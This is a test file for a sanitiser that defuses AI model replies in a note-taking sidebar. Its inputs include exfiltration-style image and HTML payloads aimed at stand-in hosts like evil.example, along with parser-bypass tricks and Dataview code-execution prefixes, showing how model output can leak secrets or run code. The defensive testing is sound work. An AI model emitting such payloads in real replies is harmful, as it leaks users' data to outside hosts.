import { describe, expect, test } from "bun:test";
import {
	classifyImagePreviewSource,
	describeDataImage,
	extractImageEmbedTargets,
	isSafeImageDestination,
	sanitizeModelMarkdown
} from "../src/ui/sidebar/renderSafety";

const ZWSP = "\u200B";

describe("sanitizeModelMarkdown: remote Markdown images", () => {
	test("turns a remote inline image into a link", () => {
		expect(sanitizeModelMarkdown("See ![chart](https://evil.example/p?d=secret)"))
			.toBe("See [Remote image: chart](https://evil.example/p?d=secret)");
	});

	test("labels a remote image with empty alt text", () => {
		expect(sanitizeModelMarkdown("![](https://evil.example/x.png)")).toBe("[Remote image](https://evil.example/x.png)");
	});

	test("handles titles, angle brackets, protocol-relative URLs and nested parentheses", () => {
		expect(sanitizeModelMarkdown("![a](https://e.example/x.png \"Title\")")).toBe("[Remote image: a](https://e.example/x.png \"Title\")");
		expect(sanitizeModelMarkdown("![a](<https://e.example/x y.png>)")).toBe("[Remote image: a](<https://e.example/x y.png>)");
		expect(sanitizeModelMarkdown("![a](//e.example/x.png)")).toBe("[Remote image: a](//e.example/x.png)");
		expect(sanitizeModelMarkdown("![a](https://e.example/x_(1).png)")).toBe("[Remote image: a](https://e.example/x_(1).png)");
	});

	test("catches schemes hidden by entities or escapes", () => {
		expect(sanitizeModelMarkdown("![a](https&#58;//e.example/x.png)")).toContain("[Remote image: a]");
		expect(sanitizeModelMarkdown("![a](https\\://e.example/x.png)")).toContain("[Remote image: a]");
		expect(sanitizeModelMarkdown("![a](HTTPS://E.EXAMPLE/X.PNG)")).toContain("[Remote image: a]");
		expect(sanitizeModelMarkdown("![a](file://server/share/x.png)")).toContain("[Remote image: a]");
	});

	test("keeps vault-relative and data:image images", () => {
		const local = "![diagram](attachments/diagram.png) and ![dot](data:image/png;base64,iVBORw0KGgo=)";
		expect(sanitizeModelMarkdown(local)).toBe(local);
		expect(sanitizeModelMarkdown("![a|300](Pictures/a%20b.png)")).toBe("![a|300](Pictures/a%20b.png)");
	});

	test("does not let a preceding bang turn the link back into an image", () => {
		const result = sanitizeModelMarkdown("Look!![a](https://e.example/x.png)");
		expect(result).toBe("Look\\![Remote image: a](https://e.example/x.png)");
		expect(result).not.toMatch(/(?<!\\)!\[/);
	});

	test("leaves escaped bangs alone", () => {
		expect(sanitizeModelMarkdown("\\![a](https://e.example/x.png)")).toBe("\\![a](https://e.example/x.png)");
	});

	test("finds the real destination behind nested brackets, code spans or HTML in alt text", () => {
		expect(sanitizeModelMarkdown("![a [b](x.png) c](https://e.example/p)")).not.toMatch(/^!\[/);
		expect(sanitizeModelMarkdown("![a `]` b](https://e.example/p)")).not.toMatch(/^!\[/);
		expect(sanitizeModelMarkdown("![a `](x.png)` b](https://e.example/p)")).not.toMatch(/^!\[/);
		expect(sanitizeModelMarkdown("![a <span title=\"](x.png)\">](https://e.example/p)")).not.toMatch(/^!\[/);
	});

	test("checks each image in a paragraph separately", () => {
		expect(sanitizeModelMarkdown("![a](x.png) and ![b](https://e.example/y.png)"))
			.toBe("![a](x.png) and [Remote image: b](https://e.example/y.png)");
	});

	test("neutralises an image that a parser might read past a wiki embed", () => {
		expect(sanitizeModelMarkdown("![[x]](https://e.example/p)")).not.toMatch(/^!\[/);
	});
});

describe("sanitizeModelMarkdown: reference-style images", () => {
	test("neutralises full, collapsed and shortcut references to remote URLs", () => {
		const definition = "\n\n[logo]: https://evil.example/logo.png";
		const broken = "\n\n[logo\\]: https://evil.example/logo.png";
		expect(sanitizeModelMarkdown(`![Logo][logo]${definition}`)).toBe(`[Remote image: Logo][logo]${broken}`);
		expect(sanitizeModelMarkdown(`![logo][]${definition}`)).toBe(`[Remote image: logo][]${broken}`);
		expect(sanitizeModelMarkdown(`![logo]${definition}`)).toBe(`[Remote image: logo]${broken}`);
	});

	test("breaks every remote definition, whatever its label or container", () => {
		expect(sanitizeModelMarkdown("Look ![pic][re\nf]\n\n[re\nf]: https://evil.example/x.png")).toContain("[re\nf\\]: https://evil.example/x.png");
		expect(sanitizeModelMarkdown("![p][r]\n\n1. - [r]: https://evil.example/x.png")).toContain("1. - [r\\]: https://evil.example/x.png");
		expect(sanitizeModelMarkdown("![pic][ẞ]\n\n[SS]: https://evil.example/x.png")).toContain("[SS\\]: https://evil.example/x.png");
		expect(sanitizeModelMarkdown("[a]:\n  //evil.example/x.png")).toBe("[a\\]:\n  //evil.example/x.png");
		expect(sanitizeModelMarkdown("[a]: <https://evil.example/x.png>")).toBe("[a\\]: <https://evil.example/x.png>");
	});

	test("keeps vault definitions and ordinary text with brackets and colons", () => {
		expect(sanitizeModelMarkdown("[a]: images/a.png")).toBe("[a]: images/a.png");
		expect(sanitizeModelMarkdown("See note [1]: details follow")).toBe("See note [1]: details follow");
		expect(sanitizeModelMarkdown("`[a]: https://example.com`")).toBe("`[a]: https://example.com`");
	});

	test("matches labels case-insensitively and across whitespace", () => {
		expect(sanitizeModelMarkdown("![x][My  Logo]\n\n[my logo]: <https://e.example/a.png>")).toContain("[Remote image: x][My  Logo]");
	});

	test("finds definitions inside blockquotes and with the URL on the next line", () => {
		expect(sanitizeModelMarkdown("![x][a]\n\n> [a]:\n> https://e.example/a.png")).toContain("[Remote image: x][a]");
	});

	test("keeps references to vault images and undefined labels", () => {
		const local = "![x][a]\n\n[a]: images/a.png";
		expect(sanitizeModelMarkdown(local)).toBe(local);
		expect(sanitizeModelMarkdown("Wow![note] is not an image")).toBe("Wow![note] is not an image");
	});
});

describe("sanitizeModelMarkdown: raw HTML", () => {
	const tags = ["img", "iframe", "video", "audio", "source", "embed", "object", "picture", "link", "style", "track"];

	for (const tag of tags) {
		test(`escapes <${tag}>`, () => {
			const result = sanitizeModelMarkdown(`Before <${tag} src="https://e.example/x"></${tag}> after`);
			expect(result).toBe(`Before &lt;${tag} src="https://e.example/x">&lt;/${tag}> after`);
		});
	}

	test("is case-insensitive and handles tags split across lines", () => {
		expect(sanitizeModelMarkdown("<IMG SRC=https://e.example/x>")).toBe("&lt;IMG SRC=https://e.example/x>");
		expect(sanitizeModelMarkdown("<img\nsrc=\"https://e.example/x\">")).toBe("&lt;img\nsrc=\"https://e.example/x\">");
	});

	test("escapes other tags only when they carry resource-loading attributes or CSS", () => {
		expect(sanitizeModelMarkdown("<div style=\"background:url(https://e.example/x)\">x</div>"))
			.toBe("&lt;div style=\"background:url(https://e.example/x)\">x</div>");
		expect(sanitizeModelMarkdown("<table background=\"https://e.example/x\">")).toBe("&lt;table background=\"https://e.example/x\">");
		const safe = "<details><summary>More</summary>Text with <b>bold</b>, <kbd>Ctrl</kbd> and <a href=\"https://example.com\">a link</a>.</details>";
		expect(sanitizeModelMarkdown(safe)).toBe(safe);
	});

	test("escapes raw <code> and <pre>, which Dataview evaluates like code spans", () => {
		expect(sanitizeModelMarkdown("<code>$= dv.current()</code>")).toBe("&lt;code>$= dv.current()&lt;/code>");
		expect(sanitizeModelMarkdown("Text <CODE>= this.file.name</CODE>")).toBe("Text &lt;CODE>= this.file.name&lt;/CODE>");
		expect(sanitizeModelMarkdown("<pre>\n$= dv.current()\n</pre>")).toContain("&lt;pre>");
	});

	test("finds attributes after a quoted \">\"", () => {
		expect(sanitizeModelMarkdown("<div title=\">\" style=\"background:url(https://e.example/x)\">x</div>"))
			.toBe("&lt;div title=\">\" style=\"background:url(https://e.example/x)\">x</div>");
	});

	test("keeps maths with < intact when a later tag loads a resource", () => {
		const result = sanitizeModelMarkdown("If $a<b$ and $c<d e$ then <img src=\"https://e.example/x\"> and <div style=\"background:url(https://e.example/y)\">");
		expect(result).toContain("$a<b$");
		expect(result).toContain("$c<d e$");
		expect(result).toContain("&lt;img src=");
		expect(result).toContain("&lt;div style=");
	});

	test("checks every tag-like candidate inside raw HTML blocks, where the browser parses leniently", () => {
		expect(sanitizeModelMarkdown("<div>\n<b$ style=\"background:url(https://e.example/x)\">\n</div>"))
			.toContain("&lt;b$ style=");
		expect(sanitizeModelMarkdown("<div>\n<b c <x style=\"background:url(https://e.example/x)\">\n</div>"))
			.toContain("&lt;b c");
	});

	test("escapes network tags inside HTML blocks", () => {
		expect(sanitizeModelMarkdown("<div>\n<img src=\"https://e.example/x\">\n</div>"))
			.toBe("<div>\n&lt;img src=\"https://e.example/x\">\n</div>");
	});

	test("leaves comparisons and escaped angle brackets alone", () => {
		expect(sanitizeModelMarkdown("if a < b and \\<img src=x>")).toBe("if a < b and \\<img src=x>");
	});
});

describe("sanitizeModelMarkdown: code is left intact", () => {
	test("code spans keep image and HTML examples", () => {
		const text = "Use `![alt](https://example.com/x.png)` or ``<img src=\"https://example.com/x.png\">`` in notes.";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("fenced code keeps its content", () => {
		const text = [
			"Example:",
			"",
			"```html",
			"<img src=\"https://example.com/x.png\">",
			"<iframe src=\"https://example.com\"></iframe>",
			"![alt](https://example.com/x.png)",
			"```",
			"",
			"~~~markdown",
			"![alt](https://example.com/y.png)",
			"~~~"
		].join("\n");
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("a longer fence keeps inner fences, including processor languages, as content", () => {
		const text = "````markdown\n```dataviewjs\ndv.paragraph(1)\n```\n````";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("an unclosed fence protects the rest of the reply", () => {
		const text = "```js\nconst x = \"<img src='https://e.example/x'>\";";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("text after a closed fence is sanitised again", () => {
		expect(sanitizeModelMarkdown("```js\nx\n```\n![a](https://e.example/x.png)"))
			.toBe("```js\nx\n```\n[Remote image: a](https://e.example/x.png)");
	});

	test("backticks inside HTML attributes, link destinations, comments or maths do not protect text", () => {
		expect(sanitizeModelMarkdown("<span title=\"`\">![x](https://e.example/a)<span title=\"`\">")).toContain("[Remote image: x]");
		expect(sanitizeModelMarkdown("[a](https://ok.example/`) ![x](https://e.example/a) [b](`)")).toContain("[Remote image: x]");
		expect(sanitizeModelMarkdown("%%`%% ![x](https://e.example/a) %%`%%")).toContain("[Remote image: x]");
		expect(sanitizeModelMarkdown("$`$ ![x](https://e.example/a) $`$")).toContain("[Remote image: x]");
	});

	test("a quoted \">\" in an HTML attribute does not pair backticks into a fake code span", () => {
		const result = sanitizeModelMarkdown("Hi <span title=\"x>`\"> ![img](https://evil.example/x.png) `</span>`");
		expect(result).toContain("[Remote image: img]");
	});

	test("a \")\" inside an angle-bracket destination or a title does not pair backticks into a fake code span", () => {
		expect(sanitizeModelMarkdown("See [a](<x)`>) ![img](https://evil.example/x.png) `")).toContain("[Remote image: img]");
		expect(sanitizeModelMarkdown("See [a](x \"t)`\") ![img](https://evil.example/x.png) `")).toContain("[Remote image: img]");
	});

	test("a line that starts any HTML tag ends fence protection until the next blank line", () => {
		const quoted = sanitizeModelMarkdown("Intro\n\n<span title=\"a>b\">\n```\n<img src=\"https://evil.example/x.png\">\n```\n");
		expect(quoted).toContain("&lt;img src=");
		const multiLine = sanitizeModelMarkdown("Intro\n\n<div\nclass=\"x\">\n```\n<img src=\"https://evil.example/x.png\">\n```\n");
		expect(multiLine).toContain("&lt;img src=");
	});

	test("a fence after an HTML block and a blank line is protected again", () => {
		const text = "<span>x</span>\n\n```html\n<img src=\"https://example.com/x.png\">\n```";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("an escaped or unclosed backtick does not start a protected span", () => {
		expect(sanitizeModelMarkdown("\\`a ![x](https://e.example/a) `")).toContain("[Remote image: x]");
		expect(sanitizeModelMarkdown("`a\n` ![x](https://e.example/a) `")).toContain("[Remote image: x]");
	});

	test("a fence hidden in a comment, maths block, HTML block or front matter does not protect what follows", () => {
		for (const opener of ["%%", "$$", "<div>", "<pre>"]) {
			const closer = opener === "<div>" ? "</div>\n" : opener === "<pre>" ? "</pre>" : opener;
			const text = `${opener}\n\`\`\`js\n${closer}\n![x](https://e.example/a)\n\`\`\``;
			expect(sanitizeModelMarkdown(text)).toContain("[Remote image: x]");
		}
		expect(sanitizeModelMarkdown("---\n```\n---\n![x](https://e.example/a)\n```")).toContain("[Remote image: x]");
	});

	test("a fence inside a blockquote or list item that ends early does not protect what follows", () => {
		expect(sanitizeModelMarkdown("> ```js\n> x\nnot quoted ![x](https://e.example/a)")).toContain("[Remote image: x]");
		expect(sanitizeModelMarkdown("1. item\n   ```js\n   code\ntext ![x](https://e.example/a)")).toContain("[Remote image: x]");
	});
});

describe("sanitizeModelMarkdown: vault embeds", () => {
	test("leaves ![[...]] embeds untouched", () => {
		const text = "![[diagram.png]] and ![[Project Plan#Risks|risks]] and ![[photo.jpg|300]]";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});
});

describe("sanitizeModelMarkdown: code-block processors", () => {
	test("relabels processor languages", () => {
		for (const language of ["dataviewjs", "dataview", "DataviewJS", "tasks", "js-engine", "query", "button"]) {
			expect(sanitizeModelMarkdown(`\`\`\`${language}\nbody\n\`\`\``)).toBe("```text\nbody\n```");
		}
	});

	test("keeps plain highlighting languages and extra info", () => {
		for (const language of ["js", "TypeScript", "python", "bash", "json", "yaml", "sql", "html", "css", "c++", "text", "mermaid", "math"]) {
			const text = `\`\`\`${language}\nbody\n\`\`\``;
			expect(sanitizeModelMarkdown(text)).toBe(text);
		}
		expect(sanitizeModelMarkdown("```dataviewjs title=\"x\"\nbody\n```")).toBe("```text title=\"x\"\nbody\n```");
	});

	test("relabels tilde fences and fences inside blockquotes, callouts and lists", () => {
		expect(sanitizeModelMarkdown("~~~dataviewjs\nx\n~~~")).toBe("~~~text\nx\n~~~");
		expect(sanitizeModelMarkdown("> [!note]\n> ```dataviewjs\n> x\n> ```")).toBe("> [!note]\n> ```text\n> x\n> ```");
		expect(sanitizeModelMarkdown("- item\n  ```dataviewjs\n  x\n  ```")).toBe("- item\n  ```text\n  x\n  ```");
		expect(sanitizeModelMarkdown("1. ```dataviewjs\n   x\n   ```")).toBe("1. ```text\n   x\n   ```");
	});

	test("relabels mermaid fences that reference URLs and keeps ordinary diagrams", () => {
		const plain = "```mermaid\nflowchart TD\n  A --> B\n```";
		expect(sanitizeModelMarkdown(plain)).toBe(plain);
		const bodies = [
			"  A@{ img: \"https://evil.example/x.png\", label: \"x\" }",
			"  A@{ img: \"//evil.example/x.png\" }",
			"  A@{ img: \"https:\\/\\/evil.example/x.png\" }",
			"  A[\"<img src='https:&#47;&#47;evil.example'>\"]",
			"  click A href \"http://evil.example\""
		];
		for (const body of bodies) {
			expect(sanitizeModelMarkdown(`\`\`\`mermaid\nflowchart TD\n${body}\n\`\`\``)).toStartWith("```text\n");
		}
		expect(sanitizeModelMarkdown("> ```mermaid\n> A --> B\n> ```\n\nSee https://example.com")).toStartWith("> ```text");
		expect(sanitizeModelMarkdown("```mermaid\nA --> B\n```\n\nSee https://example.com")).toStartWith("```mermaid");
	});

	test("relabels fences hidden inside HTML blocks too", () => {
		expect(sanitizeModelMarkdown("<div>\n```dataviewjs\nx\n```\n</div>")).toContain("```text");
	});

	test("defuses Dataview inline query prefixes in code spans and code blocks", () => {
		expect(sanitizeModelMarkdown("Run `$= dv.current()` now")).toBe(`Run \`${ZWSP}$= dv.current()\` now`);
		expect(sanitizeModelMarkdown("Value `= this.file.name`")).toBe(`Value \`${ZWSP}= this.file.name\``);
		expect(sanitizeModelMarkdown("```js\n$= dv.current()\n```")).toBe(`\`\`\`js\n${ZWSP}$= dv.current()\n\`\`\``);
		expect(sanitizeModelMarkdown("    $= dv.current()")).toBe(`    ${ZWSP}$= dv.current()`);
		expect(sanitizeModelMarkdown("price $5 and `$= x`")).toContain(`\`${ZWSP}$= x\``);
	});

	test("keeps setext headings and ordinary code", () => {
		expect(sanitizeModelMarkdown("Title\n=====")).toBe("Title\n=====");
		expect(sanitizeModelMarkdown("Title\n=")).toBe("Title\n=");
		expect(sanitizeModelMarkdown("==highlighted== text")).toBe("==highlighted== text");
		expect(sanitizeModelMarkdown("`a == b`")).toBe("`a == b`");
	});
});

describe("sanitizeModelMarkdown: general", () => {
	test("leaves ordinary Markdown alone", () => {
		const text = "# Heading\n\n- **bold** and [link](https://example.com) and [[Wiki Link]]\n\n| a | b |\n| - | - |\n| 1 | 2 |";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});

	test("normalises Windows line endings", () => {
		expect(sanitizeModelMarkdown("a\r\n![x](https://e.example/a)")).toBe("a\n[Remote image: x](https://e.example/a)");
	});

	test("treats an image whose alt text runs past the scan window as remote", () => {
		const result = sanitizeModelMarkdown(`![${"a".repeat(4100)}](https://evil.example/x.png)`);
		expect(result.startsWith("[Remote image: ")).toBe(true);
		const local = `![${"a".repeat(100)}](x.png) ${"b".repeat(5000)}`;
		expect(sanitizeModelMarkdown(local)).toBe(local);
	});

	test("handles large adversarial input in reasonable time", () => {
		const text = "![".repeat(5000) + "]".repeat(5000) + "(https://e.example/x)";
		const started = performance.now();
		const result = sanitizeModelMarkdown(text);
		expect(performance.now() - started).toBeLessThan(2000);
		expect(result).not.toMatch(/(?<!\\)!\[[^\]]*\]\(https/);
	});
});

describe("isSafeImageDestination", () => {
	test("accepts vault paths and data:image URIs only", () => {
		expect(isSafeImageDestination("folder/image.png")).toBe(true);
		expect(isSafeImageDestination(" data:image/png;base64,AAAA ")).toBe(true);
		expect(isSafeImageDestination("https://e.example/x.png")).toBe(false);
		expect(isSafeImageDestination("data:text/html,hi")).toBe(false);
		expect(isSafeImageDestination("//e.example/x.png")).toBe(false);
		expect(isSafeImageDestination("\\\\server\\share\\x.png")).toBe(false);
	});
});

describe("context image preview helpers", () => {
	test("extracts only embeds, never plain links", () => {
		const markdown = [
			"[docs](https://intranet.example/secret?token=1)",
			"![[photo.png|200]]",
			"![chart](images/chart%201.png \"Chart\")",
			"![remote](https://e.example/x.png)",
			"[[Not an embed]]",
			"\\![escaped](images/no.png)"
		].join("\n");
		expect(extractImageEmbedTargets(markdown)).toEqual(["photo.png", "images/chart 1.png", "https://e.example/x.png"]);
	});

	test("keeps data URIs whole", () => {
		const uri = "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=";
		expect(extractImageEmbedTargets(`![x](${uri})`)).toEqual([uri]);
	});

	test("classifies sources", () => {
		expect(classifyImagePreviewSource("data:image/png;base64,AA")).toBe("data");
		expect(classifyImagePreviewSource("https://e.example/x.png")).toBe("remote");
		expect(classifyImagePreviewSource("//e.example/x.png")).toBe("remote");
		expect(classifyImagePreviewSource("file:///etc/x.png")).toBe("remote");
		expect(classifyImagePreviewSource("data:text/html,x")).toBe("remote");
		expect(classifyImagePreviewSource("Attachments/x.png")).toBe("vault");
	});

	test("describes data URIs briefly", () => {
		expect(describeDataImage("data:image/png;base64,AAAA")).toBe("Inline image (png)");
		expect(describeDataImage("data:image/svg+xml;base64,AAAA")).toBe("Inline image (svg)");
	});
});
